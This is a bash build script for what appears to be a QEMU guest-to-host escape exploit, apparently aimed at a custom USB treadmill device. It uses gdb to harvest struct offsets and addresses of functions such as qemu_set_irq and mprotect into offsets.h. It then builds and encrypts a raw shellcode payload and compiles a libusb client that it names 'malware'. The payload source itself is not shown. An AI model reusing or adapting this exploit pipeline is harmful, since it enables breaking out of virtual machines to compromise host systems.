#!/bin/bash
DIR="$(dirname "$(readlink -f "$0")")"

gdb_command()
{
    gdb -batch -n -ex "$1" "$DIR/../qemu/qemu-system-x86_64"
}

add_offset()
{
    name=$(echo "$2" | tr '[:lower:]' '[:upper:]')
    offset=$(echo "$1" | grep "${3:-$2}" | sed 's/^\/\*\ *\([0-9]*\).*$/\1/')
    printf '#define OFFSET_%s %s\n' "$name" "$offset" >> offsets.h
}

add_function()
{
    name=$(echo "$2" | tr '[:lower:]' '[:upper:]')
    offset=$(echo "$1" | sed 's/^.*\(0x[0-9a-f]*\).*$/\1/')
    printf '#define FUNCTION_%s %s\n' "$name" "$offset" >> offsets.h
}

add_size()
{
    name=$(echo "$2" | tr '[:lower:]' '[:upper:]')
    offset=$(echo "$1" | grep "total size (bytes)" | tail -n1 | sed 's/^.*: \([0-9]*\).*$/\1/')
    printf '#define SIZEOF_%s %s\n' "$name" "$offset" >> offsets.h
}

get_offsets()
{
    struct=$(gdb_command 'ptype /o USBTreadmillState')
    add_offset "$struct" fw_ptr
    add_offset "$struct" fw_buf
    struct=$(gdb_command 'ptype /o USBDeviceClass')
    add_offset "$struct" handle_reset
    add_offset "$struct" handle_control
    struct=$(gdb_command 'ptype /o IRQState')
    add_offset "$struct" handler
    #add_offset "$struct" opaque
    #add_offset "$struct" n "int n"
    struct=$(gdb_command 'ptype /o CPUX86State')
    add_offset "$struct" regs "target_ulong regs"
    add_offset "$struct" hflags "hflags;"
    add_offset "$struct" hflags2
    struct=$(gdb_command 'ptype /o CPUState')
    add_size "$struct" cpustate
    add_offset "$struct" cflags_next_tb
    struct=$(gdb_command 'ptype /o DisasContext')
    add_offset "$struct" cpl
    functions="qemu_set_irq mprotect usb_treadmill_handle_reset usb_treadmill_handle_control helper_divq_EAX translator_ld __printf_chk tcg_dump_ops disas"
    for function in $functions; do
        add_function "$(gdb_command "p $function")" $function
    done
    add_function "$(gdb_command "p &helper_info_divq_EAX")" helper_info_divq_EAX
}

pushd "$DIR"

rm offsets.h
get_offsets

gcc -Wl,-N,--no-warn-rwx-segments -ffreestanding -static -nostdlib payload.S -o payload.elf
objcopy -j .text -O binary payload.elf payload.bin
python encrypt.py

gcc -lusb-1.0 main.c -O1 -o malware
strip malware

popd

